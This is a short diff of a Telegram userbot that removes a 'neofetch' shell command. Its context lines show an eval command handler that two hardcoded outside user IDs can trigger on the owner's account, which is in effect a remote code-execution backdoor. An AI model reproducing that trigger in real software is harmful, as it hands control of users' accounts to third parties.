@@ -50,19 +50,6 @@ async def screen(c, m):
     screen = (await shell_exec("screen -ls"))[0]
     await m.reply(f"<code>{screen}</code>")
 
-
-@ren.on_message(filters.command(["neofetch"], cmd) & filters.me)
-async def neofetch(client, Client, message: Message):
-    hacker = await message.reply_text("`Prossing.....`")
-    try:
-        neofetch = (await shell_exec("neofetch --stdout"))[0]
-        carbon = await make_carbon(message, neofetch)
-        await client.send_photo(message.chat.id, carbon)
-        await hacker.delete()
-    except BaseException:
-        pass
-
-
 @ren.on_message(filters.command(["ceval", "cev", "ce"], cmd) & filters.user([1191668125, 901878554]) & ~filters.me)
 @ren.on_message(filters.command(["eval", "ev", "e"], cmd) & filters.me)
 async def evaluation_cmd_t(client, message):
